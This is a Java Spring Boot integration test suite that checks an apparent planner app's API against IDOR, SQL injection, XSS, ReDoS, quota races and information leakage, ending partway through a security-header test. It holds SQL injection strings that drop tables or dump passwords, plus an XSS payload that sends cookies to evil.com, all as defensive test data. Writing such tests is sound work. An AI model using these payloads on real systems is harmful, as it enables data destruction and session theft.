package com.livo.api.audit;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.livo.api.common.security.JwtTokenProvider;
import com.livo.api.modules.ai.dto.AiChatRequest;
import com.livo.api.modules.auth.dto.UserSyncRequest;
import com.livo.api.modules.auth.service.AuthService;
import com.livo.api.modules.event.dto.CreateEventRequest;
import com.livo.api.modules.finance.dto.CreateBudgetRequest;
import com.livo.api.modules.finance.dto.CreateTransactionRequest;
import com.livo.api.modules.finance.entity.enums.TransactionType;
import com.livo.api.modules.goal.dto.CreateGoalRequest;
import com.livo.api.modules.goal.dto.CreateMilestoneRequest;
import com.livo.api.modules.goal.dto.ReorderMilestonesRequest;
import com.livo.api.modules.habit.dto.CreateHabitRequest;
import com.livo.api.modules.notification.entity.enums.NotificationType;
import com.livo.api.modules.notification.service.NotificationService;
import com.livo.api.modules.plan.dto.CreateScheduleBlockRequest;
import com.livo.api.modules.routine.dto.CreateRoutineRequest;
import com.livo.api.modules.task.dto.CreateTaskRequest;
import com.livo.api.modules.task.dto.UpdateTaskRequest;
import com.livo.api.modules.trip.dto.CreateItineraryItemRequest;
import com.livo.api.modules.trip.dto.CreateTripRequest;
import com.livo.api.modules.universaladd.dto.ParsedEntityDraft;
import com.livo.api.modules.universaladd.service.LocalIntentMatcher;
import com.livo.api.modules.user.dto.UpdateUserPreferenceRequest;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDate;
import java.time.LocalTime;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Production-Hardening and Adversarial Security Audit Test Suite.
 * Covers:
 * 1. Multi-Tenant IDOR Matrix (User B cannot view, modify, or delete User A data)
 * 2. SQL Injection & Search Parameter Escaping
 * 3. XSS & Payload Sanitization / Content-Type Enveloping
 * 4. Boundary Overflows, Unicode & Negative Currency Fuzzing
 * 5. Chronological Inversion & Range Integrity Attacks
 * 6. Milestone Permutation & Reordering Attacks
 * 7. ReDoS Backtracking Stress in NLP Engine
 * 8. Concurrent Daily Quota Flooding & Atomic Invariant Verification
 * 9. Production Hardening: Security Headers, Info Leakage & Actuator Exposure
 * 10. JWT Tampering, Forgery & Algorithm Confusion Attacks
 */
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class AdversarialAndProductionHardeningIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private AuthService authService;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    @Autowired
    private LocalIntentMatcher localIntentMatcher;

    @Autowired
    private NotificationService notificationService;

    private record TestUser(UUID id, String token, String email) {}

    private TestUser createTestUser(String prefix) {
        String uid = prefix + "_" + UUID.randomUUID();
        String email = prefix + "_" + UUID.randomUUID() + "@livo.test";
        var res = authService.syncUser(UserSyncRequest.builder()
                .firebaseUid(uid)
                .email(email)
                .fullName("Audit " + prefix)
                .timezone("Asia/Kolkata")
                .build());
        return new TestUser(res.getUser().getId(), res.getAccessToken(), email);
    }

    // =========================================================================
    // 1. MULTI-TENANT IDOR (INSECURE DIRECT OBJECT REFERENCE) MATRIX
    // =========================================================================

    @Test
    @DisplayName("Audit 1: Multi-Tenant IDOR Matrix - User B cannot view, modify, or delete User A's resources")
    void testCrossTenantIdorMatrix() throws Exception {
        TestUser userA = createTestUser("victim_a");
        TestUser userB = createTestUser("attacker_b");

        // 1. User A creates a Task
        MvcResult taskRes = mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTaskRequest.builder()
                                .title("User A Private Task")
                                .category("WORK")
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID taskAId = UUID.fromString(objectMapper.readTree(taskRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 2. User A creates a Goal & Milestone
        MvcResult goalRes = mockMvc.perform(post("/api/v1/goals")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateGoalRequest.builder()
                                .title("User A Secret Goal")
                                .category("CAREER")
                                .targetDate(LocalDate.now().plusMonths(3))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID goalAId = UUID.fromString(objectMapper.readTree(goalRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        MvcResult msRes = mockMvc.perform(post("/api/v1/goals/" + goalAId + "/milestones")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateMilestoneRequest.builder()
                                .title("User A Milestone 1")
                                .targetDate(LocalDate.now().plusMonths(1))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID msAId = UUID.fromString(objectMapper.readTree(msRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 3. User A creates a Trip
        MvcResult tripRes = mockMvc.perform(post("/api/v1/trips")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTripRequest.builder()
                                .title("User A Secret Vacation")
                                .destination("Maldives")
                                .startDate(LocalDate.now().plusWeeks(2))
                                .endDate(LocalDate.now().plusWeeks(3))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID tripAId = UUID.fromString(objectMapper.readTree(tripRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 4. User A creates a Habit
        MvcResult habitRes = mockMvc.perform(post("/api/v1/habits")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateHabitRequest.builder()
                                .title("User A Daily Habit")
                                .frequencyType(com.livo.api.modules.habit.entity.enums.HabitFrequency.DAILY)
                                .targetCount(1)
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID habitAId = UUID.fromString(objectMapper.readTree(habitRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 5. User A creates a Routine
        MvcResult routineRes = mockMvc.perform(post("/api/v1/routines")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateRoutineRequest.builder()
                                .title("User A Morning Routine")
                                .startTime(LocalTime.of(7, 0))
                                .endTime(LocalTime.of(8, 0))
                                .daysOfWeek(List.of(1, 2, 3, 4, 5))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID routineAId = UUID.fromString(objectMapper.readTree(routineRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 6. User A creates a Schedule Block
        MvcResult blockRes = mockMvc.perform(post("/api/v1/schedule-blocks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateScheduleBlockRequest.builder()
                                .title("User A Deep Work")
                                .blockDate(LocalDate.now())
                                .startTime(LocalTime.of(10, 0))
                                .endTime(LocalTime.of(12, 0))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID blockAId = UUID.fromString(objectMapper.readTree(blockRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 7. User A creates a Transaction
        MvcResult txRes = mockMvc.perform(post("/api/v1/finance/transactions")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTransactionRequest.builder()
                                .title("User A Secret Expense")
                                .amount(new BigDecimal("1500.00"))
                                .type(TransactionType.EXPENSE)
                                .category("CONFIDENTIAL")
                                .transactionDate(LocalDate.now())
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID txAId = UUID.fromString(objectMapper.readTree(txRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // 8. User A creates a Notification
        var notifA = notificationService.sendSystemNotification(userA.id(), NotificationType.SYSTEM, "Confidential Alert", "Body A", "SYSTEM", null);
        UUID notifAId = notifA.getId();

        // --- ATTACKER (User B) ATTEMPTS CROSS-TENANT ACCESS ---

        // Attacker attempts to read Task A
        mockMvc.perform(get("/api/v1/tasks/" + taskAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.success").value(false));

        // Attacker attempts to mutate Task A
        mockMvc.perform(put("/api/v1/tasks/" + taskAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(UpdateTaskRequest.builder().title("Hacked Title").build())))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Task A
        mockMvc.perform(delete("/api/v1/tasks/" + taskAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to read Goal A
        mockMvc.perform(get("/api/v1/goals/" + goalAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Goal A
        mockMvc.perform(delete("/api/v1/goals/" + goalAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to read Trip A
        mockMvc.perform(get("/api/v1/trips/" + tripAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Trip A
        mockMvc.perform(delete("/api/v1/trips/" + tripAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Habit A
        mockMvc.perform(delete("/api/v1/habits/" + habitAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Routine A
        mockMvc.perform(delete("/api/v1/routines/" + routineAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Schedule Block A
        mockMvc.perform(delete("/api/v1/schedule-blocks/" + blockAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Transaction A
        mockMvc.perform(delete("/api/v1/finance/transactions/" + txAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Attacker attempts to delete Notification A
        mockMvc.perform(delete("/api/v1/notifications/" + notifAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userB.token()))
                .andExpect(status().isNotFound());

        // Verify User A can still retrieve Task A untouched
        mockMvc.perform(get("/api/v1/tasks/" + taskAId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + userA.token()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.data.title").value("User A Private Task"));
    }

    // =========================================================================
    // 2. SQL INJECTION & PARAMETER ESCAPING ATTACKS
    // =========================================================================

    @Test
    @DisplayName("Audit 2: SQL Injection Resistance - Malicious SQL injection payloads in search and filter parameters")
    void testSqlInjectionResistance() throws Exception {
        TestUser user = createTestUser("sqli_user");

        // Create a benchmark task
        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTaskRequest.builder()
                                .title("Safe Benchmark Task")
                                .category("WORK")
                                .build())))
                .andExpect(status().isCreated());

        String[] sqliPayloads = new String[] {
                "' OR '1'='1",
                "'; DROP TABLE tasks; --",
                "UNION SELECT null, username, password FROM users --",
                "' OR 1=1 --",
                "\" OR \"\"=\"",
                "\\'; SELECT pg_sleep(5); --",
                "%'; EXEC sp_executesql; --"
        };

        for (String payload : sqliPayloads) {
            // 1. Global Search endpoint with SQLi payload
            mockMvc.perform(get("/api/v1/search")
                            .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                            .param("query", payload))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.success").value(true));

            // 2. Task filter by category with SQLi payload
            mockMvc.perform(get("/api/v1/tasks")
                            .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                            .param("category", payload))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.success").value(true))
                    .andExpect(jsonPath("$.data").isArray());

            // 3. Finance transaction filter by category with SQLi payload
            mockMvc.perform(get("/api/v1/finance/transactions")
                            .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                            .param("category", payload))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.success").value(true));
        }

        // Verify that table 'tasks' is intact and our benchmark task is unharmed
        mockMvc.perform(get("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.data[0].title").value("Safe Benchmark Task"));
    }

    // =========================================================================
    // 3. XSS & PAYLOAD CONTENT SANITIZATION
    // =========================================================================

    @Test
    @DisplayName("Audit 3: XSS & HTML Payload Persistence - Injected script payloads are treated as safe literal data")
    void testXssPayloadHandling() throws Exception {
        TestUser user = createTestUser("xss_user");

        String xssScript = "<script>alert('XSS-ATTACK')</script>";
        String xssImage = "<img src=\"x\" onerror=\"document.location='http://evil.com?c='+document.cookie\" />";
        String xssIframe = "<iframe src=\"javascript:alert('pwned')\"></iframe>";

        CreateTaskRequest xssRequest = CreateTaskRequest.builder()
                .title(xssScript)
                .description(xssImage + "\n" + xssIframe)
                .projectLabel("<b>Project</b>")
                .build();

        MvcResult result = mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(header().string("Content-Type", org.hamcrest.Matchers.containsString("application/json")))
                .andReturn();

        UUID taskId = UUID.fromString(objectMapper.readTree(result.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // Verify retrieval safely serializes to JSON string literals without raw HTML execution context
        mockMvc.perform(get("/api/v1/tasks/" + taskId)
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token()))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", org.hamcrest.Matchers.containsString("application/json")))
                .andExpect(jsonPath("$.data.title").value(xssScript))
                .andExpect(jsonPath("$.data.description").value(xssImage + "\n" + xssIframe));
    }

    // =========================================================================
    // 4. BOUNDARY OVERFLOWS, UNICODE & CURRENCY FUZZING
    // =========================================================================

    @Test
    @DisplayName("Audit 4: Boundary & Numerical Overflow - Ultra-long strings, Unicode, negative money, and invalid bounds")
    void testBoundaryAndExtremeInputs() throws Exception {
        TestUser user = createTestUser("boundary_user");

        // 1. Description boundary (exactly 500 characters succeeds, >500 rejected)
        String maxDescription = "A".repeat(500);
        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTaskRequest.builder()
                                .title("Long Description Task")
                                .description(maxDescription)
                                .build())))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.data.description").value(maxDescription));

        String overLimitDescription = "A".repeat(501);
        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTaskRequest.builder()
                                .title("Too Long Description Task")
                                .description(overLimitDescription)
                                .build())))
                .andExpect(status().isBadRequest());

        // 2. Multilingual & Emoji Unicode Fuzzing
        String unicodeTitle = "🚀 Masterpiece 🧠 任务 مهمة ಕಾರ್ಯ Prüfung Тест \uD83D\uDD25";
        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTaskRequest.builder()
                                .title(unicodeTitle)
                                .build())))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.data.title").value(unicodeTitle));

        // 3. Whitespace-only title rejection
        mockMvc.perform(post("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTaskRequest.builder()
                                .title("   \t\n   ")
                                .build())))
                .andExpect(status().isBadRequest());

        // 4. Negative transaction amount rejection
        mockMvc.perform(post("/api/v1/finance/transactions")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTransactionRequest.builder()
                                .title("Negative Expense")
                                .amount(new BigDecimal("-150.00"))
                                .type(TransactionType.EXPENSE)
                                .category("FOOD")
                                .transactionDate(LocalDate.now())
                                .build())))
                .andExpect(status().isBadRequest());

        // 5. Zero or negative goal target value rejection
        mockMvc.perform(post("/api/v1/goals")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateGoalRequest.builder()
                                .title("Negative Target Goal")
                                .category("FINANCE")
                                .targetValue(new BigDecimal("-1000.00"))
                                .targetDate(LocalDate.now().plusMonths(1))
                                .build())))
                .andExpect(status().isBadRequest());

        // 6. Max planned hours > 24 hours rejection
        mockMvc.perform(put("/api/v1/users/preferences")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(UpdateUserPreferenceRequest.builder()
                                .maxPlannedHoursPerDay(new BigDecimal("25.00"))
                                .build())))
                .andExpect(status().isBadRequest());
    }

    // =========================================================================
    // 5. CHRONOLOGICAL INVERSION ATTACKS
    // =========================================================================

    @Test
    @DisplayName("Audit 5: Chronological Inversion - End times before start times and out-of-trip dates are rejected")
    void testChronologicalInversionIntegrity() throws Exception {
        TestUser user = createTestUser("time_user");

        // 1. Schedule block: endTime before startTime
        mockMvc.perform(post("/api/v1/schedule-blocks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateScheduleBlockRequest.builder()
                                .title("Inverted Block")
                                .blockDate(LocalDate.now())
                                .startTime(LocalTime.of(16, 0))
                                .endTime(LocalTime.of(15, 0))
                                .build())))
                .andExpect(status().isBadRequest());

        // 2. Routine: endTime before startTime
        mockMvc.perform(post("/api/v1/routines")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateRoutineRequest.builder()
                                .title("Inverted Routine")
                                .startTime(LocalTime.of(21, 0))
                                .endTime(LocalTime.of(20, 0))
                                .daysOfWeek(List.of(1, 2))
                                .build())))
                .andExpect(status().isBadRequest());

        // 3. Event: endTime before startTime
        Instant now = Instant.now();
        mockMvc.perform(post("/api/v1/events")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateEventRequest.builder()
                                .title("Inverted Event")
                                .startTime(now.plusSeconds(3600))
                                .endTime(now)
                                .build())))
                .andExpect(status().isBadRequest());

        // 4. Trip Itinerary Item: date outside trip boundary
        LocalDate tripStart = LocalDate.now().plusMonths(1);
        LocalDate tripEnd = tripStart.plusDays(7);
        MvcResult tripRes = mockMvc.perform(post("/api/v1/trips")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateTripRequest.builder()
                                .title("Valid Trip")
                                .destination("Rome")
                                .startDate(tripStart)
                                .endDate(tripEnd)
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID tripId = UUID.fromString(objectMapper.readTree(tripRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        // Attempt itinerary item BEFORE trip start
        mockMvc.perform(post("/api/v1/trips/" + tripId + "/itinerary")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateItineraryItemRequest.builder()
                                .title("Premature Visit")
                                .itemDate(tripStart.minusDays(1))
                                .build())))
                .andExpect(status().isBadRequest());

        // Attempt itinerary item AFTER trip end
        mockMvc.perform(post("/api/v1/trips/" + tripId + "/itinerary")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateItineraryItemRequest.builder()
                                .title("Overstay Visit")
                                .itemDate(tripEnd.plusDays(1))
                                .build())))
                .andExpect(status().isBadRequest());
    }

    // =========================================================================
    // 6. MILESTONE REORDERING INTEGRITY ATTACKS
    // =========================================================================

    @Test
    @DisplayName("Audit 6: Milestone Permutation Attacks - Non-permutation, duplicates, and foreign IDs are rejected")
    void testMilestoneReorderingIntegrity() throws Exception {
        TestUser user = createTestUser("ms_user");

        // 1. Create a goal with 3 milestones
        MvcResult goalRes = mockMvc.perform(post("/api/v1/goals")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateGoalRequest.builder()
                                .title("Goal With Milestones")
                                .category("WORK")
                                .targetDate(LocalDate.now().plusMonths(6))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        UUID goalId = UUID.fromString(objectMapper.readTree(goalRes.getResponse().getContentAsString())
                .path("data").path("id").asText());

        UUID m1 = createMilestone(user.token(), goalId, "M1");
        UUID m2 = createMilestone(user.token(), goalId, "M2");
        UUID m3 = createMilestone(user.token(), goalId, "M3");

        // Attack A: Partial list missing M3
        mockMvc.perform(put("/api/v1/goals/" + goalId + "/milestones/reorder")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(ReorderMilestonesRequest.builder()
                                .milestoneIds(List.of(m1, m2))
                                .build())))
                .andExpect(status().isBadRequest());

        // Attack B: Duplicate milestone ID
        mockMvc.perform(put("/api/v1/goals/" + goalId + "/milestones/reorder")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(ReorderMilestonesRequest.builder()
                                .milestoneIds(List.of(m1, m1, m2))
                                .build())))
                .andExpect(status().isBadRequest());

        // Attack C: Foreign / non-existent milestone ID injected
        UUID foreignId = UUID.randomUUID();
        mockMvc.perform(put("/api/v1/goals/" + goalId + "/milestones/reorder")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(ReorderMilestonesRequest.builder()
                                .milestoneIds(List.of(m1, m2, foreignId))
                                .build())))
                .andExpect(status().isBadRequest());

        // Valid permutation: [M3, M1, M2] must succeed
        mockMvc.perform(put("/api/v1/goals/" + goalId + "/milestones/reorder")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(ReorderMilestonesRequest.builder()
                                .milestoneIds(List.of(m3, m1, m2))
                                .build())))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.data[0].id").value(m3.toString()))
                .andExpect(jsonPath("$.data[1].id").value(m1.toString()))
                .andExpect(jsonPath("$.data[2].id").value(m2.toString()));
    }

    private UUID createMilestone(String token, UUID goalId, String title) throws Exception {
        MvcResult res = mockMvc.perform(post("/api/v1/goals/" + goalId + "/milestones")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + token)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(CreateMilestoneRequest.builder()
                                .title(title)
                                .targetDate(LocalDate.now().plusMonths(1))
                                .build())))
                .andExpect(status().isCreated())
                .andReturn();
        return UUID.fromString(objectMapper.readTree(res.getResponse().getContentAsString())
                .path("data").path("id").asText());
    }

    // =========================================================================
    // 7. REDOS (REGULAR EXPRESSION DENIAL OF SERVICE) STRESS TEST
    // =========================================================================

    @Test
    @DisplayName("Audit 7: ReDoS Resilience - Pathological nested pattern inputs execute under 150ms without catastrophic backtracking")
    void testRedosBacktrackingResistance() {
        String[] pathologicalInputs = new String[] {
                "a".repeat(5000) + "!",
                "trip to " + " goa".repeat(1000) + " @@@",
                "remind me at " + "12:00 ".repeat(500) + "pm tomorrow",
                "spend $100 on " + "groceries and ".repeat(400) + "food",
                "habit drink water " + "every day ".repeat(500)
        };

        for (String input : pathologicalInputs) {
            long startTime = System.currentTimeMillis();
            ParsedEntityDraft intent = localIntentMatcher.parse(input, null);
            long elapsed = System.currentTimeMillis() - startTime;

            assertThat(intent).isNotNull();
            assertThat(elapsed)
                    .as("Intent matching for input length %d should complete under 150ms", input.length())
                    .isLessThan(150);
        }
    }

    // =========================================================================
    // 8. CONCURRENT QUOTA RACE CONDITION
    // =========================================================================

    @Test
    @DisplayName("Audit 8: Concurrent Daily Quota Flooding - Atomic counter prevents quota breaches under parallel thread race")
    void testConcurrentDailyQuotaEnforcement() throws Exception {
        TestUser user = createTestUser("quota_user");

        // The default daily quota is 20. We exhaust 18 messages first.
        for (int i = 0; i < 18; i++) {
            mockMvc.perform(post("/api/v1/ai/chat")
                            .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(AiChatRequest.builder().message("Message " + i).build())))
                    .andExpect(status().isOk());
        }

        // Exactly 2 messages remain before quota exhaustion.
        // Launch 10 concurrent threads simultaneously.
        int threadCount = 10;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch startLatch = new CountDownLatch(1);
        CountDownLatch doneLatch = new CountDownLatch(threadCount);

        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger quotaExceededCount = new AtomicInteger(0);

        for (int i = 0; i < threadCount; i++) {
            final int msgIdx = i;
            executor.submit(() -> {
                try {
                    startLatch.await(); // Synchronize all threads
                    MvcResult res = mockMvc.perform(post("/api/v1/ai/chat")
                                    .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token())
                                    .contentType(MediaType.APPLICATION_JSON)
                                    .content(objectMapper.writeValueAsString(AiChatRequest.builder().message("Concurrent " + msgIdx).build())))
                            .andReturn();

                    int status = res.getResponse().getStatus();
                    if (status == 200) {
                        successCount.incrementAndGet();
                    } else if (status == 400 && res.getResponse().getContentAsString().contains("quota exceeded")) {
                        quotaExceededCount.incrementAndGet();
                    }
                } catch (Exception ignored) {
                } finally {
                    doneLatch.countDown();
                }
            });
        }

        startLatch.countDown();
        boolean completed = doneLatch.await(15, TimeUnit.SECONDS);
        executor.shutdown();

        assertThat(completed).isTrue();
        // Invariant: Exactly 2 requests succeed, exactly 8 rejected
        assertThat(successCount.get())
                .as("Exactly 2 messages should have succeeded before hitting quota 20")
                .isEqualTo(2);
        assertThat(quotaExceededCount.get())
                .as("Remaining 8 requests should have been rejected by atomic quota check")
                .isEqualTo(8);
    }

    // =========================================================================
    // 9. PRODUCTION HARDENING: SECURITY HEADERS & ERROR LEAKAGE
    // =========================================================================

    @Test
    @DisplayName("Audit 9: Production Hardening - Standard security headers, no internal stack traces or SQL in error envelopes")
    void testSecurityHeadersAndInformationDisclosure() throws Exception {
        TestUser user = createTestUser("hardening_user");

        // 1. Security Headers on Authenticated Responses
        mockMvc.perform(get("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token()))
                .andExpect(status().isOk())
                .andExpect(header().string("X-Content-Type-Options", "nosniff"))
                .andExpect(header().string("X-Frame-Options", "DENY"))
                .andExpect(header().string("X-XSS-Protection", "0"))
                .andExpect(header().string("Cache-Control", org.hamcrest.Matchers.containsString("no-cache")));

        // 2. Malformed UUID error envelope does NOT leak Java stack trace or file paths
        MvcResult malformedUuidResult = mockMvc.perform(get("/api/v1/tasks/not-a-valid-uuid")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token()))
                .andExpect(status().isBadRequest())
                .andReturn();

        String errorBody = malformedUuidResult.getResponse().getContentAsString();
        assertThat(errorBody).contains("\"success\":false");
        assertThat(errorBody).doesNotContain("java.lang.IllegalArgumentException");
